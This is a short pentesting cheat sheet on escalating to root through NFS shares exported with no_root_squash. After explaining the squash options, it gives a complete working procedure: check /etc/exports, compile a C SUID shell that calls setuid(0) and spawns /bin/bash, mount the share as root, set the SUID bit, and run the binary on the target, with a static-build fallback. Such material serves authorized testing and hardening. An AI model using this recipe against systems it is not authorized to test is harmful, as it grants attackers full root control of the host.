# Weak NFS privileges

When an NFS volume is created, various options can be set:

| Option           | Description                                                                                                                                                                                                                                                                                   |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                           |

If we find a volume with `no_root_squash` set, we will be able to create a `SUID` binary as root on our attacker machine, mount the volume and transfer the binary to the target. This way, we will be able to obtain a root shell on the target

```shellscript
# Check the NFS config and look for directories with no_root_squash
cat /etc/exports

# If we find one, we can create a SUID binary that executes /bin/bash with our local ~
# root. Then mount the directory with the no_root_squash to the same directory locally
# copy the root owned binary to the NFS server and set the SUID 

# Create the exploit 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

# Compile it
gcc shell.c -o shell

# Being root, mount the share and copy the exploit
sudo mount -t nfs <IP>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

# On the target system, run the compiled exploit
./shell

# If we find GLIBC problems when trying to run the exploit, compile with 
sudo apt-get install musl-tools
musl-gcc shell.c -static -o shell-musl
```
